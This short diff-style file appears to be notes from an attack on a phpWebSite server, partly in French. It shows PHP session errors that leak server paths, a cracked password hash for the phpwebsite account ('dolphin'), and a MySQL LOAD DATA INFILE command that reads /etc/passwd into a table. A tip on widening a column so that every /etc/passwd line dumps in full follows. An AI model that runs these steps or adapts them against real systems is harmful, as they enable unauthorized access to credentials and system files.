@@ -1,0 +1,13 @@
+   cat investigations
+Warning: session_start() [function.session-start]: The session id contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,' in /var/www/phpwebsite/core/Core.php on line 308
+
+Warning: session_start() [function.session-start]: Cannot send session cache limiter - headers already sent (output started at /var/www/phpwebsite/core/Core.php:308) in /var/www/phpwebsite/core/Core.php on line 308
+
+
+
+phpwebsite      36cdf8b887a5cffc78dcd5c08991b993 --> dolphin
+
+
+LOAD DATA INFILE '/etc/passwd' INTO TABLE user ;
+
+changer la valeur varchar(60) ---> à 128 pour la valeur HOST pour avoir le dump complet de chaque ligne de /etc/passwd
